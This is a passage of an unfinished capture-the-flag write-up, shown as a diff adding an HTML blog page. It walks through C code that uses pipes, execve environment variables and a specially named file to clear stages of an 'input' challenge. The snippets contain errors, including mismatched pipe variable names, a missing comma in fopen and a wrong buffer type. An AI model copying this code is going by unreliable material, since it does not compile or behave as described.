+  write(<span style="color: #da8548; font-weight: bold;">2</span>, buf, <span style="color: #da8548; font-weight: bold;">4</span>);
+}
+
+
+</pre>
+</div>
+
+<p>
+But this did not work ):
+</p>
+
+<p>
+The following code after the execve will not execute because after a execve command replaces the current process with a new process image.
+</p>
+
+<p>
+<b>So we must use fork and pipes to start two processes at the same time!</b>
+</p>
+
+<p>
+First we need to have two processes, the child and parent.
+</p>
+
+<p>
+The parent process should be the once execing the input command.
+</p>
+
+<p>
+So we must have the child write its values to the parent!
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #ECBE7B;">pid_t</span> <span style="color: #dcaeea;">child</span>;
+
+<span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">stdin_pipe</span>[<span style="color: #da8548; font-weight: bold;">2</span>];
+<span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">stderr_pipe</span>[<span style="color: #da8548; font-weight: bold;">2</span>];
+
+</pre>
+</div>
+
+
+<p>
+A pipe is a collection of two fds the first is the read and the second is the write.
+</p>
+
+<p>
+Once we call pipe to instantiate the two pipes we then have to fork off the processes.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #51afef;">if</span>((child = fork()) &lt; <span style="color: #da8548; font-weight: bold;">0</span>){
+  EXIT_FAILURE(<span style="color: #98be65;">"fork failed"</span>);
+}
+</pre>
+</div>
+
+<p>
+Next lets set up the pipes&#x2026;
+</p>
+
+<p>
+For our program to work we need the child process to write to the pipes so that the parent process can access the data and redirect it to the programs stdin and stderr.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #51afef;">if</span>(child){ <span style="color: #5B6268;">// </span><span style="color: #5B6268;">parent</span>
+
+  <span style="color: #5B6268;">//</span><span style="color: #5B6268;">we must close the write end of the pipe</span>
+  close(stdin_pipe[<span style="color: #da8548; font-weight: bold;">1</span>]);
+  close(stderr_pipe[<span style="color: #da8548; font-weight: bold;">1</span>]);
+
+  <span style="color: #5B6268;">//</span><span style="color: #5B6268;">redirect the read  to stdin and stderror of the program</span>
+  dup2(stdin_pipe[<span style="color: #da8548; font-weight: bold;">0</span>], <span style="color: #da8548; font-weight: bold;">0</span>);
+  dup2(stderr_pipe[<span style="color: #da8548; font-weight: bold;">0</span>], <span style="color: #da8548; font-weight: bold;">2</span>);
+
+  <span style="color: #5B6268;">// </span><span style="color: #5B6268;">and then close them to keep things neet</span>
+  close(stdin_pipe[<span style="color: #da8548; font-weight: bold;">0</span>]);
+  close(stderr_pipe[<span style="color: #da8548; font-weight: bold;">0</span>]);
+
+  <span style="color: #5B6268;">//</span><span style="color: #5B6268;">and exec our program;</span>
+  execve(<span style="color: #98be65;">"/home/input2/input"</span>, args, <span style="color: #a9a1e1;">NULL</span>);
+
+}<span style="color: #51afef;">else</span>{ <span style="color: #5B6268;">// </span><span style="color: #5B6268;">the child</span>
+
+  <span style="color: #5B6268;">//</span><span style="color: #5B6268;">close the read ends of the pipes since we wont be using them</span>
+  close(stdin_pipe[<span style="color: #da8548; font-weight: bold;">0</span>]);
+  close(stderr_pipe[<span style="color: #da8548; font-weight: bold;">0</span>]);
+
+
+  <span style="color: #5B6268;">//</span><span style="color: #5B6268;">write the correct data to stdin and stderr</span>
+  write(pipe_stdin[<span style="color: #da8548; font-weight: bold;">1</span>], <span style="color: #98be65;">"\x00\x0a\x00\xff"</span>, <span style="color: #da8548; font-weight: bold;">4</span>);
+  write(pipe_stderr[<span style="color: #da8548; font-weight: bold;">1</span>], <span style="color: #98be65;">"\x00\x0a\x02\xff"</span>, <span style="color: #da8548; font-weight: bold;">4</span>);
+  <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+
+ }
+
+</pre>
+</div>
+
+<p>
+Okay for the next stage we are prompeted with the following
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c">
+<span style="color: #51afef;">if</span>(strcmp(<span style="color: #98be65;">"\xca\xfe\xba\xbe"</span>, getenv(<span style="color: #98be65;">"\xde\xad\xbe\xef"</span>))) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+printf(<span style="color: #98be65;">"Stage 3 clear!\n"</span>);
+
+</pre>
+</div>
+
+<p>
+So it looks like it is comparing the string &ldquo;cafebabe&rdquo; with the value that is returned from the funciton call getenv(&ldquo;\xde\xad\xbe\xef&rdquo;).
+</p>
+
+<p>
+Looking at the man page the getenv() function searches the environment list to find the environment varaible name, and returns a pointer to the corresponding value string.
+</p>
+
+<p>
+<b>So it looks like we must have our execve pass a preset environment name with the name of the enviornment &ldquo;deadbeef&rdquo; and the value string as &ldquo;cafebave&rdquo;</b>
+</p>
+
+<p>
+first lets instantiate our enviornemnt
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #ECBE7B;">char</span> *<span style="color: #dcaeea;">envp</span>[] ={ <span style="color: #98be65;">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span>, <span style="color: #a9a1e1;">NULL</span>};
+</pre>
+</div>
+
+<p>
+and then add it to the execve..
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c">
+ execve(<span style="color: #98be65;">"/home/input2/input"</span>, args, envp);
+
+</pre>
+</div>
+
+<p>
+<b>Stage 3 cleared!</b>
+</p>
+
+<p>
+For the next stage we are prompted with the following code
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #ECBE7B;">FILE</span>* <span style="color: #dcaeea;">fp</span> = fopen(<span style="color: #98be65;">"\x0a"</span>, <span style="color: #98be65;">"r"</span>);
+<span style="color: #51afef;">if</span>(<span style="color: #51afef; font-weight: bold;">!</span>fp) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+<span style="color: #51afef;">if</span>( fread(buf, <span style="color: #da8548; font-weight: bold;">4</span>, <span style="color: #da8548; font-weight: bold;">1</span>, fp)!=<span style="color: #da8548; font-weight: bold;">1</span> ) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+<span style="color: #51afef;">if</span>( memcmp(buf, <span style="color: #98be65;">"\x00\x00\x00\x00"</span>, <span style="color: #da8548; font-weight: bold;">4</span>) ) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+<span style="color: #c678dd;">fclose</span>(fp);
+printf(<span style="color: #98be65;">"Stage 4 clear!\n"</span>);
+
+</pre>
+</div>
+
+<p>
+It looks like the program is trying to open a file name &ldquo;\x0a&rdquo; to read 4 bytes into a buf and then comparing if the 4 bytes are all 0&rsquo;s.
+</p>
+
+<p>
+All we have to do is open the same file for reading and then write the contents that it checks.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #ECBE7B;">FILE</span>* <span style="color: #dcaeea;">fp</span> = fopen(<span style="color: #98be65;">"\x0a"</span> <span style="color: #98be65;">"w"</span>);
+<span style="color: #ECBE7B;">char</span> *<span style="color: #dcaeea;">buff</span>[<span style="color: #da8548; font-weight: bold;">4</span>] = <span style="color: #98be65;">"\x00\x00\x00\x00"</span>;
+<span style="color: #c678dd;">fwrite</span>(buff, <span style="color: #da8548; font-weight: bold;">4</span>, <span style="color: #da8548; font-weight: bold;">1</span>, fp);
+<span style="color: #c678dd;">fclose</span>(fp);
+</pre>
+</div>
+
+<p>
+<b>Stage 4 is cleared!</b>
+</p>
+
+<p>
+in progresss&#x2026;
+</p>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p class="date">Date: 2024-10-08 Tue 00:00</p>
+<p class="author">Author: Anthony Rossi</p>
+<p class="date">Created: 2024-10-23 Wed 21:48</p>
+</div>
+</body>
+</html>
